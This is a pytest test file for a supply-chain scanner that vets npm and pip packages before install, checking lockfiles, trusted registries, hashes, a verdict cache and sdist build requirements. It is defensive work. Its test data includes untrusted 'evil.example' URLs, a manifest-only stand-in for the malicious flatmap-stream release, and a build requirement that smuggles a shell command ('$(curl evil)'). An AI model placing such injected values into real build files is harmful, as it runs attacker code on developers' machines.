"""Packages checked before they are installed (`sources/install/`, `cordon-scanner npm|pip ...`): the
shared check, the cache, the trusted hosts, npm and pip.

The package manager and the registry are both stood in for: a runner that writes the lockfile or the
report the real tool would, and a fetcher that serves bytes from memory. The one real scan uses a
tarball that names flatmap-stream 0.1.1, the release behind the 2018 event-stream incident -- a known
record in the bundled intel -- with nothing in it but a manifest.
"""

from __future__ import annotations

import base64
import hashlib
import io
import json
import os
import subprocess
import tarfile
import threading
from pathlib import Path
from typing import Any, ClassVar

import pytest

from cordon_scanner.cli.commands.install.command import InstallGuardCommand
from cordon_scanner.cli.commands.install.context import InstallContext
from cordon_scanner.cli.commands.install.python import PythonTools
from cordon_scanner.engine.incoming import Incoming
from cordon_scanner.foundation.models import Location
from cordon_scanner.intel.base import PrivateRegistry
from cordon_scanner.sources.install.cache import VerdictCache
from cordon_scanner.sources.install.guard import InstallGuard
from cordon_scanner.sources.install.npm import NpmPlanner
from cordon_scanner.sources.install.pip import BuildRequires, PipHooks, PipPlanner, PipRequest
from cordon_scanner.sources.install.plan import (
    SHIM_MARKER,
    UNATTRIBUTED,
    InstallPlan,
    InstallRefused,
    PackageFile,
    Subprocesses,
)
from cordon_scanner.sources.install.registries import InstallRegistries

PUBLIC = InstallRegistries()


class InstallKit:
    """Stand-ins for npm, pip and the registry."""

    @staticmethod
    def tarball(name: str, version: str) -> bytes:
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
            data = json.dumps({"name": name, "version": version, "main": "index.js"}).encode()
            info = tarfile.TarInfo("package/package.json")
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
        return buffer.getvalue()

    @staticmethod
    def integrity(data: bytes) -> str:
        return "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()

    @staticmethod
    def lock(entries: dict[str, dict[str, Any]], direct: dict[str, str]) -> dict[str, Any]:
        return {
            "name": "app",
            "lockfileVersion": 3,
            "packages": {"": {"name": "app", "dependencies": direct}, **entries},
        }

    @staticmethod
    def entry(name: str, version: str, data: bytes, **extra: Any) -> dict[str, Any]:
        return {
            "version": version,
            "resolved": f"https://registry.npmjs.org/{name}/-/{name}-{version}.tgz",
            "integrity": InstallKit.integrity(data),
            **extra,
        }

    @staticmethod
    def done(code: int = 0, stderr: str = "", stdout: str = "") -> subprocess.CompletedProcess[str]:
        return subprocess.CompletedProcess([], code, stdout, stderr)

    @staticmethod
    def file(name: str, data: bytes) -> PackageFile:
        return PackageFile(
            "npm",
            name,
            "1.0.0",
            f"https://registry.npmjs.org/{name}/-/{name}-1.0.0.tgz",
            "sha512",
            hashlib.sha512(data).digest(),
        )

    @staticmethod
    def hooks(**overrides: Any) -> PipHooks:
        defaults: dict[str, Any] = {
            "scan_sdist": lambda n, v: (v, ()),
            "scan_local": lambda p: (),
            "build_tools": lambda r: [],
        }
        return PipHooks(**{**defaults, **overrides})


class TestTheNpmLockfile:
    def test_every_registry_package_is_planned_with_what_needs_it(self) -> None:
        a, b = InstallKit.tarball("a", "1.0.0"), InstallKit.tarball("b", "2.0.0")
        lock = InstallKit.lock(
            {
                "node_modules/a": InstallKit.entry("a", "1.0.0", a, dependencies={"b": "^2"}),
                "node_modules/b": InstallKit.entry("b", "2.0.0", b),
                "node_modules/local": {"link": True, "resolved": "../local"},
                "node_modules/a/node_modules/inner": {"version": "1.0.0", "inBundle": True},
                "packages/member": {"name": "member", "version": "0.0.1"},
            },
            {"a": "^1"},
        )
        files = {f.name: f for f in NpmPlanner.files(lock, PUBLIC)}
        assert set(files) == {"a", "b"}, "workspace members, links and bundled code are local"
        assert files["a"].requested and not files["b"].requested
        assert files["b"].required_by == ("a",)
        assert files["a"].required_by == ("your project",)

    @pytest.mark.parametrize(
        ("change", "why"),
        [
            (
                {"resolved": "http://registry.npmjs.org/a/-/a-1.0.0.tgz"},
                "registry Cordon can fetch",
            ),
            ({"resolved": "https://evil.example/a-1.0.0.tgz"}, "has not been told to trust"),
            ({"integrity": "sha1-abc"}, "sha1 alone is too weak"),
        ],
    )
    def test_anything_it_cannot_verify_refuses_the_install(
        self, change: dict[str, str], why: str
    ) -> None:
        data = InstallKit.tarball("a", "1.0.0")
        lock = InstallKit.lock(
            {"node_modules/a": {**InstallKit.entry("a", "1.0.0", data), **change}}, {"a": "1"}
        )
        with pytest.raises(InstallRefused, match=why):
            NpmPlanner.files(lock, PUBLIC)

    def test_the_resolve_runs_no_script_and_writes_only_a_lockfile(self, tmp_path: Path) -> None:
        (tmp_path / "package.json").write_text('{"name": "app"}', encoding="utf-8")
        data = InstallKit.tarball("a", "1.0.0")
        seen: list[list[str]] = []

        def npm(argv: Any, cwd: Path, env: Any) -> subprocess.CompletedProcess[str]:
            seen.append(list(argv))
            lock = InstallKit.lock(
                {"node_modules/a": InstallKit.entry("a", "1.0.0", data)}, {"a": "1"}
            )
            (cwd / "package-lock.json").write_text(json.dumps(lock), encoding="utf-8")
            assert cwd != tmp_path, "the resolve must run in a private copy, never the project"
            return InstallKit.done()

        plan = NpmPlanner.plan(tmp_path, ["install", "a"], npm, "npm", PUBLIC)
        assert "--package-lock-only" in seen[0] and "--ignore-scripts" in seen[0]
        assert [f.label for f in plan.files] == ["a@1.0.0"]
        assert not (tmp_path / "package-lock.json").exists(), (
            "the project is untouched until the scan passes"
        )

    def test_workspace_members_resolve_as_one_tree(self, tmp_path: Path) -> None:
        (tmp_path / "package.json").write_text('{"workspaces": ["packages/*"]}', encoding="utf-8")
        for member in ("one", "two"):
            (tmp_path / "packages" / member).mkdir(parents=True)
            (tmp_path / "packages" / member / "package.json").write_text(
                json.dumps({"name": member}), encoding="utf-8"
            )
        copied: list[bool] = []

        def npm(argv: Any, cwd: Path, env: Any) -> subprocess.CompletedProcess[str]:
            copied.append((cwd / "packages" / "two" / "package.json").is_file())
            (cwd / "package-lock.json").write_text(
                json.dumps(InstallKit.lock({}, {})), encoding="utf-8"
            )
            return InstallKit.done()

        plan = NpmPlanner.plan(tmp_path, ["install"], npm, "npm", PUBLIC)
        assert copied == [True], "every member's manifest is in the private copy"
        assert "packages/one/package.json" in plan.manifests

    def test_a_failed_resolve_is_refused(self, tmp_path: Path) -> None:
        (tmp_path / "package.json").write_text("{}", encoding="utf-8")
        with pytest.raises(InstallRefused, match="could not resolve"):
            NpmPlanner.plan(
                tmp_path, ["install", "x"], lambda *a: InstallKit.done(1, "E404"), "npm", PUBLIC
            )


class TestTheTrustedHosts:
    def test_an_alias_of_the_public_registry_is_fetched_from_the_registry(self) -> None:
        url = "https://registry.yarnpkg.com/a/-/a-1.0.0.tgz#0123abcd"
        assert PUBLIC.admit("npm", "a@1.0.0", url) == "https://registry.npmjs.org/a/-/a-1.0.0.tgz"

    def test_a_private_registry_is_trusted_only_when_the_operator_names_it(self) -> None:
        url = "https://npm.acme.example/repo/a/-/a-1.0.0.tgz"
        with pytest.raises(InstallRefused, match="has not been told to trust") as refused:
            PUBLIC.admit("npm", "a@1.0.0", url)
        assert "--cordon-registry-token" in str(refused.value.hint)
        named = InstallRegistries((PrivateRegistry("https://npm.acme.example/repo", "ACME"),))
        assert named.admit("npm", "a@1.0.0", url) == url
        with pytest.raises(InstallRefused):
            named.admit("npm", "a@1.0.0", "https://npm.acme.example/other/a.tgz")

    def test_a_private_registry_without_its_token_refuses(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.delenv("ACME", raising=False)
        named = InstallRegistries((PrivateRegistry("https://npm.acme.example/repo", "ACME"),))
        with pytest.raises(InstallRefused, match="ACME"):
            named.fetch("https://npm.acme.example/repo/a/-/a-1.0.0.tgz", "npm")


class TestThePipResolve:
    REPORT: ClassVar[dict[str, Any]] = {
        "install": [
            {
                "metadata": {"name": "requests", "version": "2.32.3"},
                "download_info": {
                    "url": "https://files.pythonhosted.org/packages/r/requests-2.32.3-py3-none-any.whl",
                    "archive_info": {"hashes": {"sha256": "ab" * 32}},
                },
                "requested": True,
            }
        ]
    }

    @staticmethod
    def report(argv: Any, body: dict[str, Any]) -> None:
        Path(argv[argv.index("--report") + 1]).write_text(json.dumps(body), encoding="utf-8")

    def test_wheels_only_until_an_sdist_is_scanned_then_pinned_to_it(self) -> None:
        calls: list[list[str]] = []
        scanned: list[tuple[str, str]] = []

        def pip(argv: Any, cwd: Path, env: Any) -> subprocess.CompletedProcess[str]:
            calls.append(list(argv))
            if len(calls) == 1:
                return InstallKit.done(1, "ERROR: No matching distribution found for oldpkg")
            constraints = Path(argv[argv.index("-c") + 1]).read_text(encoding="utf-8")
            assert constraints == "oldpkg==0.9\n" and "--no-binary=oldpkg" in argv
            assert env["PIP_CONSTRAINT"] == argv[argv.index("-c") + 1], (
                "the build pip runs inherits the same pins"
            )
            self.report(argv, self.REPORT)
            return InstallKit.done()

        def scan_sdist(name: str, version: str) -> tuple[str, tuple[str, ...]]:
            scanned.append((name, version))
            return "0.9", ()

        request = PipRequest(["pip"], ["requests", "oldpkg==0.9"])
        plan = PipPlanner.plan(request, pip, InstallKit.hooks(scan_sdist=scan_sdist), PUBLIC)
        assert "--only-binary=:all:" in calls[0] and "--dry-run" in calls[0]
        assert scanned == [("oldpkg", "0.9")]
        assert [f.label for f in plan.files] == ["requests==2.32.3"]

    def test_a_blocked_sdist_stops_before_pip_builds_it(self) -> None:
        def blocked(name: str, version: str) -> tuple[str, tuple[str, ...]]:
            raise InstallRefused(f"{name} blocked")

        pip = lambda *a: InstallKit.done(1, "No matching distribution found for evil")  # noqa: E731
        with pytest.raises(InstallRefused, match="evil blocked"):
            PipPlanner.plan(
                PipRequest(["pip"], ["evil"]), pip, InstallKit.hooks(scan_sdist=blocked), PUBLIC
            )

    def test_a_sdists_build_tools_are_scanned_and_pinned_before_pip_builds_it(self) -> None:
        tool = PackageFile(
            "pypi", "setuptools", "75.0.0", "https://files.pythonhosted.org/s/setuptools.whl",
            "sha256", b"\xcd" * 32, separator="==", build_only=True,
        )  # fmt: skip
        calls: list[list[str]] = []

        def pip(argv: Any, cwd: Path, env: Any) -> subprocess.CompletedProcess[str]:
            calls.append(list(argv))
            if len(calls) == 1:
                return InstallKit.done(1, "No matching distribution found for docopt")
            pins = Path(env["PIP_CONSTRAINT"]).read_text(encoding="utf-8")
            assert "setuptools==75.0.0" in pins and "docopt==0.6.2" in pins
            self.report(argv, self.REPORT)
            return InstallKit.done()

        asked: list[tuple[str, ...]] = []
        hooks = InstallKit.hooks(
            scan_sdist=lambda n, v: ("0.6.2", ("setuptools>=40.8.0",)),
            build_tools=lambda r: asked.append(r) or [tool],
        )
        plan = PipPlanner.plan(PipRequest(["pip"], ["docopt==0.6.2"]), pip, hooks, PUBLIC)
        assert asked == [("setuptools>=40.8.0",)]
        assert [(f.name, f.build_only) for f in plan.files] == [
            ("requests", False),
            ("setuptools", True),
        ]

    def test_a_local_project_is_scanned_before_pip_reads_it(self, tmp_path: Path) -> None:
        (tmp_path / "pyproject.toml").write_text(
            '[build-system]\nrequires = ["hatchling"]\n', encoding="utf-8"
        )
        order: list[str] = []
        rest, local, editable = PipPlanner.split_local(["-e", str(tmp_path), "requests"], tmp_path)
        assert rest == ["requests"] and editable == [str(tmp_path.resolve())] and not local

        def pip(argv: Any, cwd: Path, env: Any) -> subprocess.CompletedProcess[str]:
            order.append("pip")
            self.report(argv, self.REPORT)
            return InstallKit.done()

        hooks = InstallKit.hooks(
            scan_local=lambda p: order.append("scan") or BuildRequires.of_project(p),
            build_tools=lambda r: order.append(f"tools {r}") or [],
        )
        plan = PipPlanner.plan(PipRequest(["pip"], rest, editable=editable), pip, hooks, PUBLIC)
        assert order == ["scan", "tools ('hatchling',)", "pip"]
        assert plan.local == [tmp_path.resolve()]

    @pytest.mark.parametrize(
        "arg", ["git+https://example.invalid/r.git", "pkg @ git+https://x/r", "https://x/a.whl"]
    )
    def test_a_url_requirement_is_refused(self, arg: str, tmp_path: Path) -> None:
        with pytest.raises(InstallRefused, match="URL"):
            PipPlanner.split_local([arg], tmp_path)

    @pytest.mark.parametrize(
        ("url", "digest", "why"),
        [
            ("https://evil.example/r.whl", "ab" * 32, "has not been told to trust"),
            ("https://files.pythonhosted.org/r.whl", "", "no sha256"),
        ],
    )
    def test_a_file_it_cannot_verify_refuses(self, url: str, digest: str, why: str) -> None:
        report = {
            "install": [
                {
                    "metadata": {"name": "r", "version": "1"},
                    "download_info": {"url": url, "archive_info": {"hashes": {"sha256": digest}}},
                }
            ]
        }
        with pytest.raises(InstallRefused, match=why):
            PipPlanner.files(report, PUBLIC)


class TestTheCheck:
    SCAN = staticmethod(InstallContext.scanner(Incoming.config(None, None)))

    def test_a_file_that_differs_from_its_registry_hash_is_refused(self, tmp_path: Path) -> None:
        data = InstallKit.tarball("a", "1.0.0")
        with pytest.raises(InstallRefused, match="does not match"):
            InstallGuard.check(
                InstallPlan("npm", [InstallKit.file("a", data)]),
                self.SCAN,
                lambda u, e: data + b"x",
                tmp_path,
            )

    def test_a_known_malicious_release_is_blocked_by_the_real_scan(self, tmp_path: Path) -> None:
        data = InstallKit.tarball("flatmap-stream", "0.1.1")
        file = PackageFile(
            "npm",
            "flatmap-stream",
            "0.1.1",
            "https://registry.npmjs.org/flatmap-stream/-/flatmap-stream-0.1.1.tgz",
            "sha512",
            hashlib.sha512(data).digest(),
            required_by=("event-stream",),
        )
        verdict = InstallGuard.check(
            InstallPlan("npm", [file]), self.SCAN, lambda u, e: data, tmp_path
        )
        assert not verdict.ok
        assert set(verdict.blocking) == {file.filename}

    def test_a_clean_package_passes_the_real_scan(self, tmp_path: Path) -> None:
        data = InstallKit.tarball("left-pad-cordon-test", "1.0.0")
        file = InstallKit.file("left-pad-cordon-test", data)
        verdict = InstallGuard.check(
            InstallPlan("npm", [file]), self.SCAN, lambda u, e: data, tmp_path
        )
        assert verdict.ok, verdict.blocking

    def test_a_finding_it_cannot_attribute_still_blocks(self, tmp_path: Path) -> None:
        data = InstallKit.tarball("a", "1.0.0")

        class Stray:
            location = Location(
                path="somewhere/else.js", line=1, column=1, byte_start=0, byte_end=1
            )

        verdict = InstallGuard.check(
            InstallPlan("npm", [InstallKit.file("a", data)]),
            lambda d: (Stray(),),
            lambda u, e: data,
            tmp_path,
        )
        assert set(verdict.blocking) == {UNATTRIBUTED}

    def test_files_are_fetched_in_parallel_and_the_first_failure_stops_it(
        self, tmp_path: Path
    ) -> None:
        payloads = {f"p{i}": InstallKit.tarball(f"p{i}", "1.0.0") for i in range(12)}
        files = [InstallKit.file(name, data) for name, data in payloads.items()]
        threads: set[int] = set()
        lock = threading.Lock()

        def fetch(url: str, ecosystem: str) -> bytes:
            with lock:
                threads.add(threading.get_ident())
            name = url.rsplit("/", 1)[-1].split("-1.0.0")[0]
            return payloads[name]

        written = InstallGuard.fetch(InstallPlan("npm", files), tmp_path, fetch)
        assert len(written) == 12 and len(threads) > 1
        with pytest.raises(InstallRefused, match="could not be downloaded"):
            InstallGuard.fetch(
                InstallPlan("npm", files),
                tmp_path / "again",
                lambda u, e: (_ for _ in ()).throw(
                    RuntimeError("HTTP 503 from registry.npmjs.org")
                ),
            )


class TestTheVerdictCache:
    def test_a_clean_verdict_is_remembered_and_a_blocked_one_never(self, tmp_path: Path) -> None:
        cache = VerdictCache(tmp_path / "cache", "0.8.0|policy")
        clean = InstallKit.tarball("clean-cordon-test", "1.0.0")
        file = InstallKit.file("clean-cordon-test", clean)
        scans: list[Path] = []

        def scan(directory: Path) -> tuple[Any, ...]:
            scans.append(directory)
            return ()

        for into in ("one", "two"):
            (tmp_path / into).mkdir()
            verdict = InstallGuard.check(
                InstallPlan("npm", [file]), scan, lambda u, e: clean, tmp_path / into, cache
            )
            assert verdict.ok
        assert len(scans) == 1 and verdict.remembered == 1, "the second install rescans nothing"

    def test_a_stricter_policy_or_a_new_scanner_reuses_nothing(self, tmp_path: Path) -> None:
        VerdictCache(tmp_path, "0.8.0|default").remember(["sha512:ab"])
        assert VerdictCache(tmp_path, "0.8.0|default").clean("sha512:ab")
        assert not VerdictCache(tmp_path, "0.8.0|high").clean("sha512:ab")
        assert not VerdictCache(tmp_path, "0.8.1|default").clean("sha512:ab")

    def test_an_entry_expires_after_a_day(self, tmp_path: Path) -> None:
        import time

        cache = VerdictCache(tmp_path, "id")
        cache.remember(["k"])
        assert not cache.clean("k", now=time.time() + VerdictCache.TTL_SECONDS + 1)

    def test_switched_off_it_remembers_nothing(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("CORDON_INSTALL_CACHE", "0")
        cache = VerdictCache.default("id")
        cache.remember(["k"])
        assert cache.root is None and not cache.clean("k")


class TestTheCommand:
    def test_other_subcommands_run_unchanged(self, monkeypatch: pytest.MonkeyPatch) -> None:
        ran: list[list[str]] = []
        monkeypatch.setattr(
            Subprocesses, "executable", staticmethod(lambda tool: f"/usr/bin/{tool}")
        )
        monkeypatch.setattr(
            InstallContext, "run", staticmethod(lambda argv, *a: ran.append(argv) or 0)
        )
        assert InstallGuardCommand.main("npm", ["run", "test"]) == 0
        assert InstallGuardCommand.main("pip", ["list"]) == 0
        assert InstallGuardCommand.main("cargo", ["--version"]) == 0
        assert ran == [
            ["/usr/bin/npm", "run", "test"],
            ["/usr/bin/pip", "list"],
            ["/usr/bin/cargo", "--version"],
        ]

    def test_a_blocked_npm_install_installs_nothing(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        data = InstallKit.tarball("flatmap-stream", "0.1.1")
        lock = InstallKit.lock(
            {"node_modules/flatmap-stream": InstallKit.entry("flatmap-stream", "0.1.1", data)},
            {"flatmap-stream": "0.1.1"},
        )
        monkeypatch.chdir(tmp_path)
        monkeypatch.setenv("CORDON_INSTALL_CACHE", "0")
        (tmp_path / "package.json").write_text("{}", encoding="utf-8")
        monkeypatch.setattr(
            Subprocesses, "executable", staticmethod(lambda tool: f"/usr/bin/{tool}")
        )

        def npm(argv: Any, cwd: Path, env: Any) -> subprocess.CompletedProcess[str]:
            (cwd / "package-lock.json").write_text(json.dumps(lock), encoding="utf-8")
            return InstallKit.done()

        ran: list[list[str]] = []
        monkeypatch.setattr(Subprocesses, "run", staticmethod(npm))
        monkeypatch.setattr(
            "cordon_scanner.intel.registries.registry_request.RegistryRequest.fetch_bytes",
            staticmethod(lambda u, e: data),
        )
        monkeypatch.setattr(
            InstallContext, "run", staticmethod(lambda argv, *a: ran.append(argv) or 0)
        )
        assert InstallGuardCommand.main("npm", ["install", "flatmap-stream@0.1.1"]) == 1
        assert ran == [], "npm ci must never run after a block"
        assert not (tmp_path / "package-lock.json").exists()

    def test_cordon_options_come_off_the_front(self) -> None:
        own, rest = InstallContext.options(
            [
                "--cordon-fail-on",
                "high",
                "--cordon-config=c.yaml",
                "--cordon-no-cache",
                "install",
                "x",
            ]
        )
        assert own == {"fail-on": ["high"], "config": ["c.yaml"], "no-cache": ["1"]}
        assert rest == ["install", "x"]
        with pytest.raises(SystemExit, match="unknown option"):
            InstallContext.options(["--cordon-nope", "x"])

    def test_pip_keeps_only_where_and_how_to_install(self) -> None:
        kept = PythonTools.pip_keep(
            ["--user", "-r", "req.txt", "--index-url", "https://x", "-t", "dir", "requests"]
        )
        assert kept == ["--user", "-t=dir"]

    def test_the_real_tool_is_found_past_a_shim(self, tmp_path: Path) -> None:
        shims, real = tmp_path / "shims", tmp_path / "bin"
        shims.mkdir()
        real.mkdir()
        (shims / "npm").write_text(f"#!/bin/sh\n{SHIM_MARKER}\nexec x\n", encoding="utf-8")
        (real / "npm").write_text("#!/bin/sh\necho real\n", encoding="utf-8")
        for p in (shims / "npm", real / "npm"):
            p.chmod(0o755)
        found = Subprocesses.executable("npm", path=os.pathsep.join([str(shims), str(real)]))
        assert found == str(real / "npm")


class TestAnSdistsBuildTools:
    @staticmethod
    def sdist(pyproject: str | None) -> bytes:
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
            files = {"pkg-1.0/setup.py": "from setuptools import setup\nsetup()\n"}
            if pyproject is not None:
                files["pkg-1.0/pyproject.toml"] = pyproject
            for name, text in files.items():
                data = text.encode()
                info = tarfile.TarInfo(name)
                info.size = len(data)
                tar.addfile(info, io.BytesIO(data))
        return buffer.getvalue()

    def test_declared_build_requirements_are_read_without_unpacking(self) -> None:
        data = self.sdist('[build-system]\nrequires = ["hatchling>=1.20"]\n')
        assert BuildRequires.of("pkg-1.0.tar.gz", data) == ("hatchling>=1.20",)
        assert BuildRequires.of("pkg-1.0-py3-none-any.whl", b"") == (), "a wheel needs no build"

    def test_no_build_system_means_pips_own_default(self) -> None:
        assert BuildRequires.of("pkg-1.0.tar.gz", self.sdist(None)) == BuildRequires.DEFAULT
        assert (
            BuildRequires.of("pkg-1.0.tar.gz", self.sdist("[tool.x]\na = 1\n"))
            == BuildRequires.DEFAULT
        )

    def test_a_requirement_it_cannot_read_safely_refuses(self) -> None:
        with pytest.raises(InstallRefused, match="cannot read safely"):
            BuildRequires.of(
                "pkg-1.0.tar.gz", self.sdist('[build-system]\nrequires = ["x; $(curl evil)"]\n')
            )
